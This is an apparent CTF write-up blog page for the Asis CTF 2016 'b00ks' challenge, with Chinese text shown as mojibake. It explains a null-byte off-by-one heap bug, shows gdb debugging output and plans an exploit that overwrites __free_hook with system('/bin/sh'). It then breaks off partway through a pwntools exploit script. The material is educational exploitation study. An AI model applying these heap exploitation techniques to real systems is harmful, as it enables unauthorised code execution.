
 <!DOCTYPE HTML>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  
    <title>Asis CTF 2016 b00ks wp (null off-by-one)ã€è¯¦ã€‘ | p1Kk&#39;s World!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="p1Kk">
    

    
    <meta name="description" content="å†™äº19.6.26   æ²¡é”™æ²¡é”™ï¼Œä»CTF-wikiè¿‡æ¥çš„ï¼Œæˆ‘æ²¡çœ‹æ‡‚ï¼Œåˆå»å…¶ä»–å¤§ä½¬çš„åšå®¢==&amp;gt;ä¹å±‚å°å–å–ç»ï¼Œç»ˆäºä¼šè°ƒäº†orzâ€¦æŒæ¡gdbè°ƒè¯•å¾ˆé‡è¦å•Šå•Šå•Šï¼æ”¹æœ€ç»ˆè„šæœ¬æ”¹äº†å¥½ä¹…äº†ï¼Œå”‰ğŸ˜‘psè¿‡äºç¹çé«˜æ‰‹å¯ä»¥ç»•è¿‡åš¯åš¯åš¯  ğŸˆ0x01å¯»æ‰¾æ¼æ´checksec1234567kk@ubuntu:~/Desktop/black/wiki/off_by_one/b00ks$ checksec ./b00">
<meta name="keywords" content="pwn,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="Asis CTF 2016 b00ks wp (null off-by-one)ã€è¯¦ã€‘">
<meta property="og:url" content="p1Kk.github.io/2019/10/03/Asis CTF 2016 b00ks(obo)/wp/index.html">
<meta property="og:site_name" content="p1Kk&#39;s World!">
<meta property="og:description" content="å†™äº19.6.26   æ²¡é”™æ²¡é”™ï¼Œä»CTF-wikiè¿‡æ¥çš„ï¼Œæˆ‘æ²¡çœ‹æ‡‚ï¼Œåˆå»å…¶ä»–å¤§ä½¬çš„åšå®¢==&amp;gt;ä¹å±‚å°å–å–ç»ï¼Œç»ˆäºä¼šè°ƒäº†orzâ€¦æŒæ¡gdbè°ƒè¯•å¾ˆé‡è¦å•Šå•Šå•Šï¼æ”¹æœ€ç»ˆè„šæœ¬æ”¹äº†å¥½ä¹…äº†ï¼Œå”‰ğŸ˜‘psè¿‡äºç¹çé«˜æ‰‹å¯ä»¥ç»•è¿‡åš¯åš¯åš¯  ğŸˆ0x01å¯»æ‰¾æ¼æ´checksec1234567kk@ubuntu:~/Desktop/black/wiki/off_by_one/b00ks$ checksec ./b00">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-86e117eb462f4de9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-0d9f9df5a3cbbd22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-f7c2b70d6504c0b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:updated_time" content="2020-09-10T13:48:37.124Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Asis CTF 2016 b00ks wp (null off-by-one)ã€è¯¦ã€‘">
<meta name="twitter:description" content="å†™äº19.6.26   æ²¡é”™æ²¡é”™ï¼Œä»CTF-wikiè¿‡æ¥çš„ï¼Œæˆ‘æ²¡çœ‹æ‡‚ï¼Œåˆå»å…¶ä»–å¤§ä½¬çš„åšå®¢==&amp;gt;ä¹å±‚å°å–å–ç»ï¼Œç»ˆäºä¼šè°ƒäº†orzâ€¦æŒæ¡gdbè°ƒè¯•å¾ˆé‡è¦å•Šå•Šå•Šï¼æ”¹æœ€ç»ˆè„šæœ¬æ”¹äº†å¥½ä¹…äº†ï¼Œå”‰ğŸ˜‘psè¿‡äºç¹çé«˜æ‰‹å¯ä»¥ç»•è¿‡åš¯åš¯åš¯  ğŸˆ0x01å¯»æ‰¾æ¼æ´checksec1234567kk@ubuntu:~/Desktop/black/wiki/off_by_one/b00ks$ checksec ./b00">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/17548101-86e117eb462f4de9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">

    
    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/site.jpg">
    
    
    <link rel="apple-touch-icon" href="/img/head.png">
    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
				<h2 class="blog-motto">è‰ºæ— æ­¢å¢ƒï¼ŒåŠŸä¸å”æã€‚</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
						<li><a href="/tags">Tags</a></li>
					
						<li><a href="/categories">Categories</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:p1Kk.github.io">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
	
	  <article itemprop="articleBody"> 
		  <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2019/10/03/Asis CTF 2016 b00ks(obo)/wp/" title="Asis CTF 2016 b00ks wp (null off-by-one)ã€è¯¦ã€‘" itemprop="url">Asis CTF 2016 b00ks wp (null off-by-one)ã€è¯¦ã€‘</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
		
  <p class="article-time">
    <time datetime="2019-10-02T16:00:00.000Z" itemprop="datePublished"> Published 2019-10-03</time>
    
  </p>
</header>
	  <div class="article-content">
		  
		  <div id="toc" class="toc-article">
			  <strong class="toc-title">Contents</strong>
		  
			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ğŸˆ0x01å¯»æ‰¾æ¼æ´"><span class="toc-number">1.</span> <span class="toc-text">ğŸˆ0x01å¯»æ‰¾æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida"><span class="toc-number">1.0.2.</span> <span class="toc-text">ida</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ğŸˆ0x02åˆ†ææ„é€ "><span class="toc-number">2.</span> <span class="toc-text">ğŸˆ0x02åˆ†ææ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ç–‘é—®è§£ç­”"><span class="toc-number">2.0.1.</span> <span class="toc-text">ç–‘é—®è§£ç­”</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ğŸˆ0x03æ”»å‡»"><span class="toc-number">3.</span> <span class="toc-text">ğŸˆ0x03æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ğŸ“‚å®Œæ•´EXP"><span class="toc-number">3.0.1.</span> <span class="toc-text">ğŸ“‚å®Œæ•´EXP</span></a></li></ol></li></ol></li></ol>
		  
		  </div>
		  
		  <ul>
<li>å†™äº19.6.26</li>
</ul>
<blockquote>
<p>æ²¡é”™æ²¡é”™ï¼Œä»<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/" target="_blank" rel="noopener">CTF-wiki</a>è¿‡æ¥çš„ï¼Œæˆ‘æ²¡çœ‹æ‡‚ï¼Œåˆå»å…¶ä»–å¤§ä½¬çš„åšå®¢==&gt;<a href="https://blog.csdn.net/qq_38204481/article/details/81320898" target="_blank" rel="noopener">ä¹å±‚å°</a>å–å–ç»ï¼Œç»ˆäºä¼šè°ƒäº†orzâ€¦æŒæ¡gdbè°ƒè¯•å¾ˆé‡è¦å•Šå•Šå•Šï¼æ”¹æœ€ç»ˆè„šæœ¬æ”¹äº†å¥½ä¹…äº†ï¼Œå”‰ğŸ˜‘psè¿‡äºç¹çé«˜æ‰‹å¯ä»¥ç»•è¿‡åš¯åš¯åš¯</p>
</blockquote>
<h1 id="ğŸˆ0x01å¯»æ‰¾æ¼æ´"><a href="#ğŸˆ0x01å¯»æ‰¾æ¼æ´" class="headerlink" title="ğŸˆ0x01å¯»æ‰¾æ¼æ´"></a>ğŸˆ0x01å¯»æ‰¾æ¼æ´</h1><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/wiki/off_by_one/b00ks$ checksec ./b00ks </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/wiki/off_by_one/b00ks/b00ks&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>å¼€å¯PIEï¼ˆï¼‰<br>ç¨‹åºå®ç°çš„æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ï¼Œæœ‰ä»¥ä¸‹çš„åŸºæœ¬åŠŸèƒ½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: kk</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>åœ¨è¾“å…¥ä½œè€…åå­—æ—¶è°ƒç”¨<code>sub_9F5</code>ï¼ˆæˆ‘æ”¹åä¸º<code>My_read</code>ï¼‰</p>
<p><img src="https://upload-images.jianshu.io/upload_images/17548101-86e117eb462f4de9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/17548101-0d9f9df5a3cbbd22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>è¯»å…¥32ä¸ªå­—ç¬¦ï¼Œç¬¬33ä½è¢«å‡½æ•°ç½®ä¸º\x00 <strong>==&gt;NULL byte Off-By-One</strong></p>
<p>æ¼æ´æ‰¾åˆ°<del>~</del></p>
<h1 id="ğŸˆ0x02åˆ†ææ„é€ "><a href="#ğŸˆ0x02åˆ†ææ„é€ " class="headerlink" title="ğŸˆ0x02åˆ†ææ„é€ "></a>ğŸˆ0x02åˆ†ææ„é€ </h1><p>ä¸‹é¢å…·ä½“ç†è§£ä¸€ä¸‹è¿™äº›åŠŸèƒ½</p>
<p><strong>create</strong>ä¸»è¦</p>
<p>malloc name</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;v1);</span><br><span class="line">ptr = malloc(v1);</span><br></pre></td></tr></table></figure>

<p>malloc description</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;v1);</span><br><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">if ( v1 &gt;= 0 )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = malloc(v1);</span><br><span class="line">  Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mallocä¸‹é¢çš„ç»“æ„ä½“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc(0x20uLL);</span><br><span class="line">if ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)v3 + 6) = v1;          //description size</span><br><span class="line">  *((_QWORD *)off_202010 + v2) = v3;//book</span><br><span class="line">  *((_QWORD *)v3 + 2) = v5;         // description</span><br><span class="line">  *((_QWORD *)v3 + 1) = ptr;        // name</span><br><span class="line">  *(_DWORD *)v3 = ++unk_202024;      //æ¯æœ¬ä¹¦çš„ID</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬è°ƒè¯•ç†è§£ä¸€ä¸‹ï¼Œåˆ©ç”¨gdb-pedaä¸­çš„<code>find</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/wiki/off_by_one/b00ks$ gdb ./b00ks </span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/kk/Desktop/black/wiki/off_by_one/b00ks/b00ks </span><br><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabc</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">Enter book name size: 10</span><br><span class="line">Enter book name (Max 32 chars): aaaaa</span><br><span class="line"></span><br><span class="line">Enter book description size: 10</span><br><span class="line">Enter book description: bbbbb</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>Ctrl+Cå</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find abc</span><br><span class="line">Searching for &apos;abc&apos; in: None ranges</span><br><span class="line">Found 9 results, display max 9 items:</span><br><span class="line">     b00ks : 0x55555575605d --&gt; 0x636261 (&apos;abc&apos;)</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®0x55555575605dæ‰¾å¯¹é½åœ°å€æŸ¥çœ‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10g 0x555555756040</span><br><span class="line">0x555555756040:	0x6161616161616161	                0x6161616161616161</span><br><span class="line">0x555555756050:	0x6161616161616161	                0x6362616161616161 ==&gt;author name</span><br><span class="line">0x555555756060:	0x0000555555757460 ==&gt;book1åœ°å€æŒ‡é’ˆ  0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000                	0x0000000000000000</span><br><span class="line">0x555555756080:	0x0000000000000000	                0x0000000000000000</span><br><span class="line">gdb-peda$ x/10g 0x0000555555757460</span><br><span class="line">0x555555757460:	0x0000000000000001 ==&gt;ID	        0x0000555555757420 ==&gt;book name</span><br><span class="line">0x555555757470:	0x0000555555757440 ==&gt;description	0x000000000000000a ==&gt;description size</span><br><span class="line">0x555555757480:	0x0000000000000000	                0x0000000000020b81 ==&gt;top chunk</span><br><span class="line">0x555555757490:	0x0000000000000000	                0x0000000000000000</span><br><span class="line">0x5555557574a0:	0x0000000000000000              	0x0000000000000000</span><br><span class="line">gdb-peda$ x/g 0x0000555555757420</span><br><span class="line">0x555555757420:	0x0000006161616161</span><br><span class="line">gdb-peda$ x/g 0x0000555555757440</span><br><span class="line">0x555555757440:	0x0000006262626262</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿™ä¸ªæ–¹æ³•ï¼Œåˆåˆ›å»ºäº†ä¸€ä¸ªbook2ï¼Œå†çœ‹çœ‹ä»–ä»¬çš„å¸ƒç½®</p>
<p><img src="https://upload-images.jianshu.io/upload_images/17548101-f7c2b70d6504c0b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>ä»ä¸Šåˆ†æå¾—ï¼Œæˆ‘ä»¬å†™å…¥çš„author nameçš„æœ€åçš„NULLå­—èŠ‚ä¼šè¢«book1æŒ‡é’ˆè¦†ç›–ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰“å°author nameçš„æ—¶å€™ï¼Œå°±å¯ä»¥å¾—åˆ°book1çš„åœ°å€</p>
<p>æ¥ä¸‹æ¥ï¼Œç”±äºç¨‹åºæä¾›äº†<strong>Change</strong>å‡½æ•°ï¼Œæˆ‘ä»¬ä¿®æ”¹author nameä¸ºâ€œaâ€ * 30 + â€œdâ€ * 2ï¼ˆèƒ½åŒºåˆ«å°±æˆï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0x555555756040</span><br><span class="line">0x555555756040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555756050:	0x6161616161616161	0x6464616161616161</span><br><span class="line">0x555555756060:	0x0000555555757400	0x00005555557574d0</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åŒæ ·ç”±äº33ä½å˜ä¸º\x00çš„åŸå› ï¼Œæˆ‘ä»¬çš„book1åœ°å€æœ€åä¸€ä¸ªå­—èŠ‚è¢«ä¿®æ”¹ä¸º00</p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ï¼š</p>
<p><strong>1.è®¾ç½®author nameé•¿åº¦ä¸º32ï¼Œ33ä½çš„\x00è¢«book1åœ°å€è¦†å†™åï¼Œè¾“å‡ºauthor nameå³å¯æ³„éœ²book1åœ°å€ã€‚<br>2.é€šè¿‡ä¿®æ”¹author nameï¼Œä½¿åä¸¤ä½å˜ä¸º00ï¼Œå¸ƒç½®ä½¿æˆ‘ä»¬çš„book1çš„æŒ‡é’ˆï¼ˆå˜00æ—¶ï¼‰æŒ‡å‘çš„æ˜¯book1çš„descriptionã€‚<br>3.é€šè¿‡ä¿®æ”¹book1çš„descriptionï¼Œä½¿descriptionå†…å®¹ä¸ºfake_book1ã€‚<br>4.fake_book1ä¸­çš„book nameå’ŒdescriptionæŒ‡é’ˆï¼ŒæŒ‡å‘book2çš„descriptionã€‚ï¼ˆoffset = 0x20 + 0x10 + 0x8 = 0x38ï¼‰<br>5.è¾“å‡ºbook1ï¼Œé‚£ä¹ˆbook1çš„descriptionå°±æ˜¯fake_book1ï¼Œå°±å¯ä»¥æ‰“å°å‡ºbook2çš„descriptionçš„åœ°å€ï¼Œå®ç°æ³„éœ²ï¼Œå¾—åˆ°libc_baseã€‚<br>6.å°†book2çš„descriptionè®¾ç½®ä¸º<code>__free_hook</code>å‡½æ•°ï¼Œå°†book2çš„nameè®¾ç½®ä¸º<code>system(&quot;/bin/sh&quot;)</code>å‡½æ•°ï¼Œå†free book2ï¼Œè°ƒç”¨<code>__free_hook</code>ï¼Œæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ã€‚ã€è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>execve</code>ï¼Œè¿™ä¸ªå¯ä»¥åœ¨<code>onegadget</code>ä¸­æ‰¾åˆ°ã€‘</strong>\</p>
<h3 id="ç–‘é—®è§£ç­”"><a href="#ç–‘é—®è§£ç­”" class="headerlink" title="ç–‘é—®è§£ç­”"></a>ç–‘é—®è§£ç­”</h3><blockquote>
<p>ğŸŒ¼ä¸ºä»€ä¹ˆdescription sizeè¢«æ”¾åˆ°äº†v3+3çš„ä½ç½®ï¼Ÿ<br>ç­”ï¼šå› ä¸º*((_DWORD *)v3 + 6) = v1; è¯¥è¯­å¥å°†v3ä½œä¸ºåŒå­—èŠ‚å¤„ç†ï¼ŒåŒå­—èŠ‚çš„+6 ç›¸å½“äº å•å­—èŠ‚çš„+3ã€‚<br>æ¶‰åŠåˆ°ä¸€ä¸ªå†…å­˜å¯¹é½çš„æ¦‚å¿µï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ª64ä½çš„ç¨‹åºï¼Œæœºå™¨å­—é•¿ä¸º8ä¸ªå­—èŠ‚ï¼Œidæ˜¯intå‹æ•°æ®ï¼Œå­˜å…¥å †ä¸­åªå­˜äº†4å­—èŠ‚ã€‚è€Œæ¥ä¸‹æ¥å­˜çš„nameæ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹æ•°æ®ï¼Œåœ¨64ä½ç³»ç»Ÿä¸­æ˜¯8å­—èŠ‚ï¼Œä¸èƒ½æŠŠnameæŒ‡é’ˆæ‹†æˆä¸¤åŠï¼Œå¦‚æœæ‹†å¼€çš„è¯è¿˜è¦å†æ¬¡ç»„åˆå¯¹äºåº•å±‚ç¡¬ä»¶æ¥è¯´æ˜¯ä¸€ä¸ªå¤æ‚çš„äº‹ã€‚æ‰€ä»¥ä¸ºäº†è¿›ä¸€æ­¥æé«˜é€Ÿåº¦ï¼Œå°†é‚£ä¹ˆæŒ‡é’ˆæ”¾å…¥äº†åé¢æ–°çš„8å­—èŠ‚ã€‚è¿™æ ·ä¸€æ¥å°±ç©ºå‡ºäº†4å­—èŠ‚ã€‚<br>ğŸŒ¼ä¸ºä»€ä¹ˆbook2çš„sizeè¦è®¾ç½®çš„å¾ˆå¤§ï¼Ÿ<br>ç­”ï¼šé€šè¿‡å‰é¢æˆ‘ä»¬å·²ç»è·å¾—äº†ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›ï¼Œè¯»è€…è¯»åˆ°è¿™é‡Œå¯èƒ½ä¼šè§‰å¾—ä¸‹é¢çš„æ“ä½œæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œæ¯”å¦‚å†™ got è¡¨åŠ«æŒæµç¨‹æˆ–è€…å†™ <code>__malloc_hook</code> åŠ«æŒæµç¨‹ç­‰ã€‚ä½†æ˜¯è¿™ä¸ªé¢˜ç›®ç‰¹æ®Šä¹‹å¤„åœ¨äºå¼€å¯ PIE å¹¶ä¸”æ²¡æœ‰æ³„æ¼ libc åŸºåœ°å€çš„æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æƒ³ä¸€ä¸‹å…¶ä»–çš„åŠæ³•ã€‚<br>æ‰€ä»¥æˆ‘ä»¬åœ¨åˆ†é…ç¬¬äºŒä¸ª book æ—¶ï¼Œä½¿ç”¨ä¸€ä¸ªå¾ˆå¤§çš„å°ºå¯¸ï¼Œä½¿å¾—å †ä»¥ mmap æ¨¡å¼è¿›è¡Œæ‹“å±•ã€‚æˆ‘ä»¬çŸ¥é“å †æœ‰ä¸¤ç§æ‹“å±•æ–¹å¼ä¸€ç§æ˜¯<code>brk</code>ä¼šç›´æ¥æ‹“å±•åŸæ¥çš„å †ï¼Œå¦ä¸€ç§æ˜¯ <code>mmap</code> ä¼šå•ç‹¬æ˜ å°„ä¸€å—å†…å­˜ã€‚<br>åœ¨è¿™é‡Œæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªè¶…å¤§çš„å—ï¼Œæ¥ä½¿ç”¨ <code>mmap</code> æ‰©å±•å†…å­˜ã€‚å› ä¸º <code>mmap</code> åˆ†é…çš„å†…å­˜ä¸ libc ä¹‹å‰å­˜åœ¨å›ºå®šçš„åç§»å› æ­¤å¯ä»¥æ¨ç®—å‡º libc çš„åŸºåœ°å€ã€‚<br>ğŸŒ¼ä¸ºä»€ä¹ˆè®¾ç½®<code>__free_hook</code>å‡½æ•°ï¼Ÿ<br>ç­”ï¼šè¿™é‡Œæˆ‘ä»¬éœ€è¦ç®€å•ä»‹ç»ä¸€ä¸‹<code>__free_hook</code>å‡½æ•°<br>å½“è°ƒç”¨freeå‡½æ•°çš„æ—¶å€™å½“__free_hookå†…å®¹ä¸ä¸ºNULLæ—¶ï¼Œä¼šä¼˜å…ˆæ‰§è¡Œå…¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†è¯¥å‡½æ•°å‚æ•°è®¾ç½®ä¸ºsystemï¼Œå°±å¯ä»¥å®ç°getshell</p>
</blockquote>
<h1 id="ğŸˆ0x03æ”»å‡»"><a href="#ğŸˆ0x03æ”»å‡»" class="headerlink" title="ğŸˆ0x03æ”»å‡»"></a>ğŸˆ0x03æ”»å‡»</h1><p>å†™è„šæœ¬ï¼Œè¾¹å†™è¾¹ç”¨gdb.attach()è°ƒè¯•ï¼ˆå·®ä¸å¤šå°±æ˜¯é‡å¤ä¸Šé¢çš„æ­¥éª¤ï¼Œçœ‹çœ‹ç©ºé—´å¸ƒå±€ï¼Œä¸æƒ³çœ‹å¯ä»¥ç›´æ¥çœ‹æ–‡æœ«å®Œæ•´è„šæœ¬ç†è§£äº†ï¼‰<br>å‡½æ•°çš„åŸºæœ¬æ“ä½œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">def createbook(name_size, name, des_size, des):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line">def deletebook(id):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line"></span><br><span class="line">def editbook(id, new_des):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line">def printbook(id):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    for i in range(id):</span><br><span 